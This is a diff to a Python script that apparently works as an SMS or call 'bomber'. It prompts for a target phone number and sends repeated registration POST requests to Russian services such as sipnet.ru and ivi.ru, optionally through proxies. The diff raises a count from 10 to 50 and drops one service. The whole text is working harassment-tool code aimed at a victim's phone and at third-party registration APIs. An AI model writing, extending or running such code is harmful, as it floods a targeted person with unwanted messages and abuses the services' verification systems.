@@ -50,7 +50,7 @@ except Exception:
     pass
 
 a = input('Select target:')
-b = 10
+b = 50
 class services():
 	# service number 1
 	def service1(self, a, proxies):
@@ -81,12 +81,6 @@ class services():
 		r = requests.post('https://register.sipnet.ru/cgi-bin/exchange.dll/RegisterHelper?oper=9&phone=79821432646',
 			data = {"phone":a,"oper":"9"})
 		print('sipnet.ru ' + str(r.status_code))
-
-	# service number 6
-	def service6(self, a, proxies):
-		r = requests.post('https://api.ivi.ru/mobileapi/user/register/phone/v6/',
-			data = {"phone":a}, proxies=proxies)
-		print('ivi.ru ' + str(r.status_code))
 
 	# service number 7
 	def service7(self, a, proxies):
